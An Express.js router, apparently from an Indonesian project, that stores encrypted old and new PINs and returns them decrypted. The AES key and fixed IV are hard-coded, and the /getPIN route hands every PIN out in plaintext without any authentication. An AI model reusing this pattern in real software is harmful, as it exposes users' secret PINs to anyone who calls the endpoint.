const express = require("express");
const router = express.Router();
const RiwayatPin = require("../models/dbRiwayatPin");
const crypto = require("crypto");

const aesKey = Buffer.from([
  12, 23, 34, 45, 56, 67, 78, 89, 98, 87, 76, 65, 54, 43, 32, 21,
]);
const aesIv = Buffer.from([
  123, 43, 46, 89, 29, 187, 58, 213, 78, 50, 19, 106, 205, 1, 5, 7,
]);

function decrypt(encryptedBase64Text, key, iv) {
  const decipher = crypto.createDecipheriv("aes-128-cbc", key, iv);
  let decrypted = decipher.update(encryptedBase64Text, "base64", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}


router.post("/kirimRiwayatPin", async (req, res) => {
  const {
    encryptedText2,
    encryptedText3,
 } = req.body;

  const timestamp = new Date();

  const newRiwayatPin = new RiwayatPin({
    encryptedText2: encryptedText2,
    encryptedText3: encryptedText3,
  });

  try {
    const result = await newRiwayatPin.save();
    console.log("Berhasil menyimpan data semua:", result);
    res.status(200).json({ message: "Berhasil menyimpan data semua" });
  } catch (err) {
    console.log("Gagal menyimpan data semua:", err);
    res.status(500).json({ message: "Gagal menyimpan data semua" });
  }
});

router.get("/getRiwayatPin", async (req, res) => {
  try {
    const data = await RiwayatPin.find({});
    console.log("Berhasil mengambil data all");
    res.status(200).json(data);
  } catch (err) {
    console.log("Gagal mengambil data all:", err);
    res.status(500).json({ message: "Gagal mengambil data all" });
  }
});


router.get("/getPIN", async (req, res) => {
  try {
    const data = await RiwayatPin.find({}).sort({ createdAt: -1 });

    const newData = data.map((item) => ({
      _id: item._id,
      encryptedText2: item.encryptedText2,
      pin_lama: decrypt(item.encryptedText2, aesKey, aesIv).replace(
        /\0/g,
        ""
      ),
      encryptedText3: item.encryptedText3,
      pin_baru: decrypt(item.encryptedText3, aesKey, aesIv).replace(
        /\0/g,
        ""
      ),
      createdAt: item.createdAt,
      updatedAt: item.updatedAt,
    }));

    console.log("Berhasil mengambil data ");
    res.status(200).json(newData);
  } catch (err) {
    console.log("Gagal mengambil data :", err);
    res.status(500).json({
      message: "Gagal mengambil data ",
    });
  }
});

module.exports = router;